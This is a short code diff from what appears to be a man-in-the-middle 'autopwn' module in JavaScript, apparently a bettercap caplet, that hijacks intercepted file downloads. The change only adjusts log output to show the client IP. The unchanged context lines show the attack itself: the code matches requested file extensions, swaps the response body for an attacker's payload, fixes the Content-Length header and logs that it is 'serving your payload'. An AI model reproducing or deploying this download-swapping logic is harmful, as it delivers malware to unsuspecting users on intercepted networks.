@@ -43,7 +43,7 @@ function onResponse(req, res) {
 					if ( requestedFileName.replace(/.*\./g, "").toLowerCase() == targets[t]["extensions"][e] ) {
 						extension = targets[t]["extensions"][e]
 						// Autopwn
-						logStr = "\n" + redLine + "  Autopwning download request from " + boldRed + req.Client + reset + 
+						logStr = "\n" + redLine + "  Autopwning download request from " + boldRed + req.Client.IP + reset + 
 						         redLine + 
 						         redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset + 
 						         redLine + 
@@ -71,7 +71,7 @@ function onResponse(req, res) {
 						// Update Content-Length header
 						res.SetHeader("Content-Length", payload.length)
 						logStr += redLine + 
-						          redLine + "  Serving your payload to " + boldRed + req.Client + reset + "...\n"
+						          redLine + "  Serving your payload to " + boldRed + req.Client.IP + reset + "...\n"
 						log(logStr)
 						res.Body = payload
 					}
